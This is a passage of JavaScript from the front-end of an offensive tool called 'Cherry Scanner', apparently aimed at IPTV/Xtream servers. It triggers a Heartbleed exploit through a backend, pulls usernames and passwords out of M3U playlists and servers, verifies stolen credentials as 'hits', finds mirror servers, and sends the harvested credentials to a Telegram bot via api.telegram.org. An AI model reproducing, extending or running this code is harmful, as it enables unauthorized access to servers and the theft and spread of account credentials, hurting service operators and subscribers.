    .then(r => r.ok ? showNotification('✅ Hit enviado a Telegram', 'success') : showNotification('❌ Error al enviar', 'error'))
    .catch(() => showNotification('❌ Error de conexión', 'error'));
}

// ===== GUARDAR CONFIGURACIÓN DE TELEGRAM EN LOCALSTORAGE =====
function saveTelegramConfig() {
    const token = elements.telegramToken?.value.trim();
    const chatId = elements.telegramChatId?.value.trim();
    
    if (token) {
        localStorage.setItem('cherryTelegramToken', token);
    }
    if (chatId) {
        localStorage.setItem('cherryTelegramChatId', chatId);
    }
    
    if (token || chatId) {
        showNotification('✅ Configuración de Telegram guardada', 'success');
    } else {
        showNotification('⚠️ No hay datos para guardar', 'warning');
    }
}

function loadTelegramConfig() {
    const token = localStorage.getItem('cherryTelegramToken');
    const chatId = localStorage.getItem('cherryTelegramChatId');
    
    if (token && elements.telegramToken) {
        elements.telegramToken.value = token;
    }
    if (chatId && elements.telegramChatId) {
        elements.telegramChatId.value = chatId;
    }
}

// Botón para borrar configuración guardada (opcional)
function clearTelegramConfig() {
    if (confirm('¿Eliminar la configuración de Telegram guardada?')) {
        localStorage.removeItem('cherryTelegramToken');
        localStorage.removeItem('cherryTelegramChatId');
        if (elements.telegramToken) elements.telegramToken.value = '';
        if (elements.telegramChatId) elements.telegramChatId.value = '';
        showNotification('🗑️ Configuración eliminada', 'info');
    }
}

// ===== HISTORIAL =====
function addToHistory(host, total, open, vuln) {
    let ts = new Date().toLocaleString();
    let entry = {
        id: Date.now(),
        timestamp: ts,
        host: host,
        totalPorts: total,
        openPorts: open || 0,
        vulnerablePorts: vuln || 0,
        status: (open > 0 || vuln > 0) ? '✅ Completado' : '⚠️ Sin resultados'
    };
    
    scanState.scanHistory.unshift(entry);
    if (scanState.scanHistory.length > 15) scanState.scanHistory.pop();
    updateHistoryTable();
    if (elements.historyCount) elements.historyCount.textContent = scanState.scanHistory.length;
}

function updateHistoryTable() {
    if (!elements.historyList) return;
    
    if (!scanState.scanHistory.length) {
        elements.historyList.innerHTML = '<div class="empty">No hay escaneos</div>';
        return;
    }
    
    let html = '';
    scanState.scanHistory.slice(0, 10).forEach((item) => {
        let statusClass = item.openPorts > 0 ? 'success' : 'warning';
        let time = item.timestamp.split(' ')[1] || item.timestamp;
        html += `<div class="history-item ${statusClass}">
            <span class="history-time">${time}</span>
            <span class="history-host">${item.host.length > 18 ? item.host.substring(0,15)+'...' : item.host}</span>
            <span class="history-stats">${item.openPorts}/${item.totalPorts}</span>
            <span class="history-status">${item.status}</span>
        </div>`;
    });
    
    elements.historyList.innerHTML = html;
}

// ===== EXPLOITS INDIVIDUALES =====
async function heartbleedExploit() {
    let host = scanState.currentHost || elements.host?.value.trim();
    let port = elements.heartbleedPort?.value.trim();
    
    if (!host) {
        showNotification('❌ Primero escanea un servidor', 'error');
        return;
    }
    if (!port) {
        showNotification('❌ Puerto requerido', 'error');
        return;
    }
    
    addLiveResult(`🔥 Heartbleed en ${host}:${port}...`, 'info');
    
    try {
        let proxy = (elements.useProxyCheck?.checked) ? getNextProxy() : null;
        
        let r = await fetch(`${API_BASE}/exploit/heartbleed`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ host, port: parseInt(port), proxy })
        });
        
        let d = await r.json();
        
        if (d.vulnerable) {
            addLiveResult(`✅ VULNERABLE! Datos: ${d.data_size} bytes`, 'success');
            if (d.credentials) {
                d.credentials.forEach(c => addLiveResult(`🔑 ${c.username}:${c.password}`, 'cred'));
            }
        } else {
            addLiveResult(`❌ No vulnerable`, 'warning');
        }
    } catch (e) {
        addLiveResult(`❌ Error: ${e.message}`, 'error');
    }
}

async function extractFromM3U() {
    let url = elements.m3uUrl?.value.trim();
    if (!url) {
        showNotification('❌ URL M3U requerida', 'error');
        return;
    }
    
    addLiveResult(`📥 Procesando M3U...`, 'info');
    
    try {
        let proxy = (elements.useProxyCheck?.checked) ? getNextProxy() : null;
        
        let r = await fetch(`${API_BASE}/m3u/process`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ url, proxy })
        });
        
        let d = await r.json();
        
        if (d.success) {
            addLiveResult(`✅ Servidor: ${d.server_url} (${d.server_ip})`, 'success');
            if (d.credentials && d.credentials.length) {
                d.credentials.forEach(c => addLiveResult(`🔑 ${c.username}:${c.password}`, 'cred'));
            }
        } else {
            addLiveResult(`❌ Error: ${d.error}`, 'error');
        }
    } catch (e) {
        addLiveResult(`❌ ${e.message}`, 'error');
    }
}

async function sniBruteForce() {
    let host = elements.host?.value.trim();
    let domain = elements.sniDomain?.value.trim();
    
    if (!host) {
        showNotification('❌ Servidor requerido', 'error');
        return;
    }
    if (!domain) {
        showNotification('❌ SNI Domain requerido', 'error');
        return;
    }
    
    addLiveResult(`🔍 SNI para ${domain} en ${host}:443`, 'info');
    
    try {
        let proxy = (elements.useProxyCheck?.checked) ? getNextProxy() : null;
        
        let r = await fetch(`${API_BASE}/sni-test`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ host, port: 443, sni: domain, proxy })
        });
        
        let d = await r.json();
        
        if (d.success) {
            addLiveResult(`✅ SNI exitoso: ${domain}`, 'success');
        } else {
            addLiveResult(`❌ SNI fallido`, 'warning');
        }
    } catch (e) {
        addLiveResult(`❌ Error: ${e.message}`, 'error');
    }
}

async function verifyCredentials() {
    let host = elements.host?.value.trim();
    let user = elements.verifyUser?.value.trim();
    let pass = elements.verifyPass?.value.trim();
    
    if (!host) {
        showNotification('❌ Servidor requerido', 'error');
        return;
    }
    if (!user || !pass) {
        showNotification('❌ Usuario y contraseña', 'error');
        return;
    }
    
    addLiveResult(`✅ Verificando ${user}:${pass}...`, 'info');
    
    try {
        let proxy = (elements.useProxyCheck?.checked) ? getNextProxy() : null;
        
        let r = await fetch(`${API_BASE}/verify`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ host, port: 80, username: user, password: pass, proxy })
        });
        
        let d = await r.json();
        
        if (d.success && d.hit) {
            addLiveResult(`🎯 HIT ENCONTRADO!`, 'hit');
            addHitToUI(d.hit);
        } else {
            addLiveResult(`❌ Credenciales inválidas`, 'error');
        }
    } catch (e) {
        addLiveResult(`❌ Error: ${e.message}`, 'error');
    }
}

async function scanM3UServer() {
    let host = elements.m3uServerHost?.value.trim() || elements.host?.value.trim();
    let port = elements.m3uServerPort?.value.trim() || 80;
    
    if (!host) {
        showNotification('❌ Host requerido', 'error');
        return;
    }
    
    addLiveResult(`🔍 Buscando M3U en ${host}:${port}...`, 'info');
    
    try {
        let proxy = (elements.useProxyCheck?.checked) ? getNextProxy() : null;
        
        let r = await fetch(`${API_BASE}/m3u/server`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ host, port: parseInt(port), proxy })
        });
        
        let d = await r.json();
        
        if (d.success && d.count) {
            d.found.forEach(f => {
                addLiveResult(`📁 M3U: ${f.url}`, 'success');
                if (f.credentials) {
                    f.credentials.forEach(c => addLiveResult(`   🔑 ${c.username}:${c.password}`, 'cred'));
                }
            });
        } else {
            addLiveResult(`❌ No se encontraron M3U`, 'warning');
        }
    } catch (e) {
        addLiveResult(`❌ Error: ${e.message}`, 'error');
    }
}

async function findMirrors() {
    let host = elements.host?.value.trim();
    if (!host) {
        showNotification('❌ Servidor requerido', 'error');
        return;
    }
    
    addLiveResult(`🪞 Buscando espejos para ${host}...`, 'info');
    
    try {
        let proxy = (elements.useProxyCheck?.checked) ? getNextProxy() : null;
        
        let r = await fetch(`${API_BASE}/mirrors`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ host, proxy })
        });
        
        let d = await r.json();
        
        if (d.success && d.mirrors.length) {
            d.mirrors.forEach(m => addLiveResult(`🪞 ${m.host}:${m.port} - ${m.service}`, 'mirror'));
        } else {
            addLiveResult(`⚠️ No se encontraron espejos`, 'warning');
        }
    } catch (e) {
        addLiveResult(`❌ Error: ${e.message}`, 'error');
    }
}

// ===== ACCIONES RÁPIDAS =====
function xstreamAction() { extractFromM3U(); }
function brutaAction() { exploitAll(); }
function espejosAction() { findMirrors(); }

// ===== FORMATOS DE EXPORTACIÓN =====
function formatHitForExport(hit) {
    return formatHitForTXT(hit); // Usamos el formato TXT para exportación general
}

function formatScanForExport() {
    let output = '';
    const host = scanState.currentHost || 'Desconocido';
    const timestamp = new Date().toLocaleString();
    
    output += 'ᘻ3SSᗩ10 CHERRY SCANNER\n';
    output += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n';
    output += `📅 Fecha: ${timestamp}\n`;
    output += `🎯 Servidor: ${host}\n`;
    output += `📊 Puertos escaneados: ${scanState.results.length}\n`;
    output += `🔓 Abiertos: ${scanState.results.filter(r => r.open).length}\n`;
    output += `🔥 Vulnerables: ${scanState.vulnerablePorts.length}\n`;
    output += `🏆 Hits encontrados: ${scanState.hits.length}\n`;
    output += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n';
    
    if (scanState.results.filter(r => r.open).length > 0) {
        output += '📡 PUERTOS ABIERTOS:\n';
        output += '────────────────────\n';
        scanState.results.filter(r => r.open).forEach(r => {
            output += `  ├─ Puerto ${r.port} ➤ ${r.service}\n`;
            if (r.banner) output += `  │  └─ Banner: ${r.banner.substring(0, 50)}\n`;
        });
        output += '\n';
    }
    
    if (scanState.vulnerablePorts.length > 0) {
        output += '🔥 PUERTOS VULNERABLES:\n';
        output += '──────────────────────\n';
        scanState.vulnerablePorts.forEach(v => {
            output += `  ├─ ${v.host}:${v.port} ➤ ${v.service}\n`;
            if (v.vuln_details) {
                output += `  │  └─ CVE: ${v.vuln_details.cve} - ${v.vuln_details.description}\n`;
            }
        });
        output += '\n';
    }
    
    if (scanState.hits.length > 0) {
        output += '🍒 HITS ENCONTRADOS:\n';
        output += '────────────────────\n';
        scanState.hits.forEach((h, i) => {
            output += `  HIT #${i+1}:\n`;
            output += `  ├─ Host: ${h.host}:${h.port}\n`;
            output += `  ├─ Usuario: ${h.username}\n`;
            output += `  ├─ Password: ${h.password}\n`;
            output += `  ├─ Expira: ${h.exp_date || 'Ilimitado'}\n`;
            if (h.m3u_url) output += `  └─ M3U: ${h.m3u_url}\n`;
        });
        output += '\n';
    }
    
    if (scanState.mirrors.length > 0) {
        output += '🪞 ESPEJOS ENCONTRADOS:\n';
        output += '──────────────────────\n';
        scanState.mirrors.forEach(m => {
            output += `  ├─ ${m.host}:${m.port} ➤ ${m.service}\n`;
        });
        output += '\n';
    }
    
    output += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n';
    output += 'ᘻ3SSᗩ10 · CHERRY SCANNER · VELVET EDITION\n';
    
    return output;
}

// ===== EXPORTACIÓN PRINCIPAL =====
window.exportSelected = async function(format) {
    let hits = elements.exportHitsCheck?.checked;
    let scan = elements.exportScanCheck?.checked;
    
    if (format === 'telegram') {
        if (!hits && !scan) {
            showNotification('❌ Selecciona qué exportar', 'warning');
            return;
        }
        
        // Usar valores guardados o los del input
        let token = localStorage.getItem('cherryTelegramToken') || elements.telegramToken?.value.trim();
        let chatId = localStorage.getItem('cherryTelegramChatId') || elements.telegramChatId?.value.trim();
        
        if (!token || !chatId) {
            showNotification('❌ Token y Chat ID requeridos (guárdalos primero)', 'error');
            return;
        }
        
        let msg = '';
        if (hits && scanState.hits.length) {
            scanState.hits.slice(-5).forEach(h => {
                msg += formatHitForTelegram(h) + '\n\n';
            });
        }
        if (scan && scanState.currentHost) {
            msg += `📊 ESCANEO: ${scanState.currentHost}\n`;
            msg += `🔓 Abiertos: ${scanState.results.filter(r => r.open).length}\n`;
            msg += `🔥 Vulnerables: ${scanState.vulnerablePorts.length}`;
        }
        
        try {
            let r = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: msg })
            });
            showNotification(r.ok ? '✅ Enviado' : '❌ Error', r.ok ? 'success' : 'error');
        } catch (e) {
            showNotification('❌ Error de conexión', 'error');
        }
        return;
    }
    
    let content = '';
    if (hits && scan) {
        content = formatScanForExport();
    } else if (hits) {
        content = scanState.hits.map(h => formatHitForTXT(h)).join('\n\n');
    } else if (scan) {
        content = formatScanForExport();
    } else {
        showNotification('❌ Selecciona qué exportar', 'warning');
        return;
    }
    
    let filename = `cherry_scan_${new Date().toISOString().slice(0, 10)}.${format}`;
    let blob = new Blob([content], { type: format === 'txt' ? 'text/plain' : 'application/json' });
    let a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = filename;
    a.click();
    URL.revokeObjectURL(a.href);
    showNotification(`✅ Exportado a ${format.toUpperCase()}`, 'success');
};

// ===== LIMPIEZA Y CONTROL =====
function stopScan() {
    scanState.isScanning = false;
    scanState.isExploiting = false;
    showNotification('⏸️ Proceso detenido', 'warning');
}

function clearFields() {
    if (elements.host) elements.host.value = '';
    if (elements.ports) elements.ports.value = '';
    if (elements.m3uUrl) elements.m3uUrl.value = '';
    if (elements.telegramToken) elements.telegramToken.value = '';
    if (elements.telegramChatId) elements.telegramChatId.value = '';
    window.clearFile();
    showNotification('🧹 Campos limpiados', 'success');
}

async function clearAllData() {
    if (!confirm('¿Eliminar todos los datos?')) return;
    
    try {
        await fetch(`${API_BASE}/clear`, { method: 'POST' });
    } catch (e) {}
    
    // Limpiar TODO el estado
    scanState = {
        ...scanState,
        results: [],
        vulnerablePorts: [],
        credentials: [],
        hits: [],
        mirrors: [],
        scanHistory: [],
        currentHost: '',
        loadedFileData: { server: null, targets: [], fileName: null, rawContent: null, servers: [] },
        config: scanState.config
    };
    
    // Limpiar TODOS los elementos visuales
    if (elements.vulnPortsContainer) {
        elements.vulnPortsContainer.innerHTML = '<div class="empty"><i class="fas fa-search"></i> No hay puertos vulnerables</div>';
    }
    if (elements.recentHitsList) {
        elements.recentHitsList.innerHTML = '<div class="empty"><i class="fas fa-search"></i> No hay hits aún</div>';
    }
    if (elements.portsList) elements.portsList.innerHTML = '';
    if (elements.vulnList) elements.vulnList.innerHTML = '';
    if (elements.hitsList) elements.hitsList.innerHTML = '';
    if (elements.historyList) {
        elements.historyList.innerHTML = '<div class="empty">No hay escaneos</div>';
    }
    if (elements.liveResults) {
        elements.liveResults.innerHTML = '';
    }
    if (elements.filePreview) {
        elements.filePreview.style.display = 'none';
        elements.fileUploadArea.style.display = 'block';
    }
    if (elements.fileStats) {
        elements.fileStats.innerHTML = '';
    }
    
    // Resetear progreso
    if (elements.scanProgressBar) elements.scanProgressBar.style.width = '0%';
    if (elements.scanProgressText) elements.scanProgressText.textContent = '0%';
    if (elements.scanSpeed) elements.scanSpeed.textContent = '0';
    if (elements.scanEta) elements.scanEta.textContent = '--:--';
    if (elements.scanProcessed) elements.scanProcessed.textContent = '0';
    if (elements.scanTotal) elements.scanTotal.textContent = '0';
    
    updateStats();
    updateExploitButtons();
    showNotification('✅ Todos los datos eliminados', 'success');
}

// ===== ESTADÍSTICAS =====
function updateStats() {
    if (elements.statTotal) elements.statTotal.textContent = scanState.results.length;
    if (elements.statOpen) elements.statOpen.textContent = scanState.results.filter(r => r.open).length;
    if (elements.statVuln) elements.statVuln.textContent = scanState.vulnerablePorts.length;
    if (elements.statHits) elements.statHits.textContent = scanState.hits.length;
    if (elements.vulnCount) elements.vulnCount.textContent = scanState.vulnerablePorts.length;
    if (elements.recentHitsCount) elements.recentHitsCount.textContent = scanState.hits.length;
    if (elements.historyCount) elements.historyCount.textContent = scanState.scanHistory.length;
}

// ===== CONFIGURACIÓN =====
function openSettings() {
    if (elements.settingsModal) elements.settingsModal.classList.add('show');
}

function closeSettings() {
    if (elements.settingsModal) elements.settingsModal.classList.remove('show');
}

function saveSettings() {
    scanState.config.timeout = parseInt(elements.configTimeout?.value) || 3;
    scanState.config.threads = parseInt(elements.configThreads?.value) || 100;
    scanState.config.proxies = elements.configProxies?.value || '';
    showNotification('✅ Configuración guardada', 'success');
    closeSettings();
}

// ===== INICIALIZACIÓN =====
document.addEventListener('DOMContentLoaded', () => {
    console.log("🍒 CHERRY SCANNER inicializado - Versión PRO con guardado Telegram");
    initFileUpload();
    
    // Cargar configuración de Telegram guardada
    loadTelegramConfig();
    
    fetch(`${API_BASE}/health`)
        .then(r => r.json())
        .then(d => showNotification(`✅ Conectado al backend v${d.version}`, 'success'))
        .catch(() => showNotification('❌ Backend no disponible', 'error'));
    
    if (elements.scanBtn) elements.scanBtn.addEventListener('click', startScan);
    if (elements.xstreamBtn) elements.xstreamBtn.addEventListener('click', xstreamAction);
    if (elements.brutaBtn) elements.brutaBtn.addEventListener('click', brutaAction);
    if (elements.espejosBtn) elements.espejosBtn.addEventListener('click', espejosAction);
    
    if (elements.heartbleedBtn) elements.heartbleedBtn.addEventListener('click', heartbleedExploit);
    if (elements.extractM3UBtn) elements.extractM3UBtn.addEventListener('click', extractFromM3U);
    if (elements.sniBtn) elements.sniBtn.addEventListener('click', sniBruteForce);
    if (elements.verifyBtn) elements.verifyBtn.addEventListener('click', verifyCredentials);
    if (elements.scanM3UServerBtn) elements.scanM3UServerBtn.addEventListener('click', scanM3UServer);
    
    if (elements.exploitSelectedBtn) elements.exploitSelectedBtn.addEventListener('click', exploitSelected);
    if (elements.exploitAllBtn) elements.exploitAllBtn.addEventListener('click', exploitAll);
    
    if (elements.clearFieldsBtn) elements.clearFieldsBtn.addEventListener('click', clearFields);
    if (elements.clearDataBtn) elements.clearDataBtn.addEventListener('click', clearAllData);
    if (elements.stopScanBtn) elements.stopScanBtn.addEventListener('click', stopScan);
    
    if (elements.settingsBtn) elements.settingsBtn.addEventListener('click', openSettings);
    if (elements.modalClose) elements.modalClose.addEventListener('click', closeSettings);
    if (elements.cancelSettingsBtn) elements.cancelSettingsBtn.addEventListener('click', closeSettings);
    if (elements.saveSettingsBtn) elements.saveSettingsBtn.addEventListener('click', saveSettings);
    
    // Botón guardar Telegram
    if (elements.saveTelegramBtn) {
        elements.saveTelegramBtn.addEventListener('click', saveTelegramConfig);
    }
    
    if (elements.portsFilter) elements.portsFilter.addEventListener('input', renderPortsList);
    if (elements.vulnFilter) elements.vulnFilter.addEventListener('input', () => {
        displayVulnerablePorts(scanState.vulnerablePorts);
    });
    
    if (elements.exportBothCheck) {
        elements.exportBothCheck.addEventListener('change', function() {
            if (this.checked) {
                elements.exportHitsCheck.checked = true;
                elements.exportScanCheck.checked = true;
                elements.exportHitsCheck.disabled = true;
                elements.exportScanCheck.disabled = true;
            } else {
                elements.exportHitsCheck.disabled = false;
                elements.exportScanCheck.disabled = false;
            }
        });
    }
    
    window.loadAllPorts = loadAllPorts;
    window.loadWebPorts = loadWebPorts;
    window.loadIPTVPorts = loadIPTVPorts;
    window.exportSelected = exportSelected;
    window.clearFile = clearFile;
    window.copyToClipboard = copyToClipboard;
});

const style = document.createElement('style');
style.textContent = `
    @keyframes slideIn {
        from { transform: translateX(100%); opacity: 0; }
        to { transform: translateX(0); opacity: 1; }
    }
    @keyframes slideOut {
        from { transform: translateX(0); opacity: 1; }
        to { transform: translateX(100%); opacity: 0; }
    }
`;
document.head.appendChild(style);